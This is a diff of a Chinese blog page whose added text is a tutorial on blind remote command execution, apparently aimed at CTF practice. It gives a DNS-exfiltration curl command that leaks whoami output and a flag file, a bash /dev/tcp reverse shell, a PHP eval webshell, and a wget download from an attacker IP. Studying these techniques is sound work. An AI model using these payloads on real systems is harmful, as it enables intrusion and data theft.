@@ -792,7 +792,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-03-13 23:40:52" itemprop="dateModified" datetime="2025-03-13T23:40:52+08:00">2025-03-13</time>
+                <time title="修改时间：2025-10-16 20:00:05" itemprop="dateModified" datetime="2025-10-16T20:00:05+08:00">2025-10-16</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -829,17 +829,47 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="什么是无回显RCE？"><a href="#什么是无回显RCE？" class="headerlink" title="什么是无回显RCE？"></a>什么是无回显RCE？</h2><p>无回显RCE，简单来说就是没有任何回显，不管命令或代码是否执行成功。这样的命令执行函数有exec()、shell_exec()。</p>
+          <span id="more"></span>
+
+<h2 id="什么是无回显RCE？"><a href="#什么是无回显RCE？" class="headerlink" title="什么是无回显RCE？"></a>什么是无回显RCE？</h2><p>无回显RCE，简单来说就是没有任何回显，不管命令或代码是否执行成功。这样的命令执行函数有exec()、shell_exec()。</p>
 <h2 id="判断是否执行成功"><a href="#判断是否执行成功" class="headerlink" title="判断是否执行成功"></a>判断是否执行成功</h2><ol>
 <li><p>延时：</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2025/03/03/%E6%97%A0%E5%9B%9E%E6%98%BERCE/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">windows</span>：whoami&amp;&amp;ping -n <span class="number">5</span> <span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">Linux</span>：whoami&amp;&amp;sleep <span class="number">5</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>目标服务器向个人的公网服务器<strong>发起http请求</strong>，当该公网服务器收到http请求就代表命令有执行</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">6666</span></span><br><span class="line"><span class="attribute">curl</span> 公网服务器IP:端口号</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><h3 id="tee命令"><a href="#tee命令" class="headerlink" title="tee命令"></a>tee命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> | <span class="built_in">tee</span> a <span class="comment">#将ls的结果输入文件a中</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="dnslog-cn外带"><a href="#dnslog-cn外带" class="headerlink" title="dnslog.cn外带"></a><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">dnslog.cn</a>外带</h3><ol>
+<li>适用Linux</li>
+<li>命令用反引号包裹</li>
+<li>命令中不能有空格</li>
+</ol>
+<p>示例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl `<span class="built_in">whoami</span>`.lc52y4.dnslog.cn</span><br><span class="line">curl `<span class="built_in">cat</span> flag|sed s/[[:space:]]//`.lc52y4.dnslog.cn</span><br></pre></td></tr></table></figure>
+
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nc -lvp <span class="number">6666</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/服务器IP/<span class="number">6666</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="直接写入或外部下载webshell"><a href="#直接写入或外部下载webshell" class="headerlink" title="直接写入或外部下载webshell"></a>直接写入或外部下载webshell</h3><ol>
+<li><p>直接写入，需要站点目录具有写权限：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php @eval(\$_POST[1]);?&gt;&quot;</span> &gt; exp.php</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>外部下载，目标服务器可以连接外网且与攻击机互通：</p>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">wget 攻击机IP <span class="punctuation">-</span>o <span class="built_in">exp</span>.php</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="各种命令执行"><a href="#各种命令执行" class="headerlink" title="各种命令执行"></a>各种命令执行</h3><p><strong>前提：目标服务器上要有已知可读文件，站点目录具有写权限</strong></p>
+<p>通过执行命令，直接将php文件写入到在浏览器可直接读取的文件类型中(如txt文件)，然后访问txt文件即可得到php文件内容。</p>
+<ol>
+<li><p>cp和mv和重定向</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> flag.php 1.txt</span><br><span class="line"><span class="built_in">mv</span> flag.php 1.txt</span><br><span class="line"><span class="built_in">cat</span> flag.php &gt; 1.txt</span><br><span class="line"><span class="built_in">cat</span> flag.php &gt;&gt; 1.txt</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>tar和zip</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar cvf flag.tar flag.php  <span class="comment"># 打包flag.php为flag.tar</span></span><br><span class="line">tar zcvf flag.tar.gz flag.php  <span class="comment"># 压缩flag.php为flag.tar.gz</span></span><br><span class="line"><span class="comment"># 解压缩：tar zxvf flag.tar.gz</span></span><br><span class="line">zip flag.zip flag.php</span><br><span class="line"><span class="comment">#解压缩：unzip flag.zip</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kinyoobi/p/15415869.html">无回显的渗透技巧 - kinyoobi - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pursue-security/p/15406672.html">RCE篇之无回显rce - 学安全的小白 - 博客园</a></p>
+
       
     </div>
 
